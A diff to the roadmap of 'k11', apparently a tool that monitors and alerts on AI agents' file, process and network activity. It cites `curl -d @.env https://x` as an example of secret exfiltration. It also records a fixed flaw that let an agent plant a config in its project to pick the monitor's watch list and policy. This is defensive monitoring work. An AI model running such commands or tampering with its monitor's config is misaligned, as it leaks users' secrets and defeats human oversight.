@@ -15,7 +15,9 @@ no action planned).
 What stands between k11 today and "every file, process, network and socket action", and between a recorder and something people keep open. Little Snitch is the model for the second: it shows what an app reaches as it happens and turns an answer into a rule.
 
 - [x] **Command lines.** Exec records named the binary only: `curl -d @.env https://x` was `exec /usr/bin/curl`. The probe now reads argv from the new image (`mm->arg_start..arg_end`, offsets from BTF) into a record built in the ring, up to 1 KB, and says when it cut. Event lines name the binary exec found, then the arguments, so argv[0] cannot pose as another program; OCSF carries `process.cmd_line`; the dashboard shows it per process; processes already running when watched take theirs from /proc.
-- [ ] **`k11 report`**: open a past session from the OCSF log, in the terminal and the dashboard. The record exists; k11 cannot replay it.
+- [x] **`k11 report`**: past sessions from the OCSF log. The log is replayed through the daemon's own store (`ocsf::replay`, the inverse of `record`, tested record by record), so `k11 report last` prints what `k11 run` printed, commands included. The export is now on by default, so the record exists without a config.
+- [ ] **A past session in the dashboard**: the same replay, served.
+- [x] **The config was searched in the working directory** (`config/k11.toml`), as root: an agent could leave one in its project and pick k11's watch list, policy and export path. Only `/etc/k11/k11.toml`, `$K11_CONFIG` or `--config` now. The example config was stale (`deny_exec_paths`, `deny_ipv4`, `format`); it now lists the real keys and defaults, and a test parses it.
 - [ ] **Inbound and connectionless network**: `accept`, `sendto`/`sendmsg` destinations, bytes sent.
 - [x] **Tell.** Notices for an agent reaching a host outside this machine's networks, opening a port to other hosts, touching a sensitive file (failed attempts included), matching a deny rule, tracing a process: once per agent tree and target, kept by the daemon (500), polled by id (`GetNotices`). The dashboard shows them with an unread count in the tab title, turns a file notice into a deny rule in one click, and raises desktop alerts when asked.
 - [ ] **Ask, for hosts (needs a decision).** Deny a host from its notice: a `socket_connect` deny next to `file_open`. k11 sees addresses, not the names an agent looked up, so a rule is an address (or its network) labelled with what k11 resolved. This widens the enforcement surface the non-goals keep at `file_open` (X2).
@@ -162,7 +164,7 @@ Checked against schema.ocsf.io 1.1.0.
   - [x] `correlation_uid` is now `<boot id>:<root pid>`: stable across daemon restarts.
   - [x] Typed `unmapped` fields (`root_pid`, `risk_score`, mode, gid, backlog, ptrace request, symlink target) and `access_mask` for open flags.
   - [x] `metadata.sequence` from the decoder's per-event `seq`.
-  - [ ] Record types are serialize-only; `Cow` plus `Deserialize` gives one set of types both ways. Do it with `k11 report`.
+  - [x] Record types are serialize-only. `k11 report` reads back with its own small types (`ocsf/read.rs`) sharing the class and activity constants; the record types borrow from the live event and stay as they are.
   - [x] Loss markers: when probe counters grow, the export gets a Base Event ("k11 lost N records") with the deltas.
 
 ### DNS and GeoIP
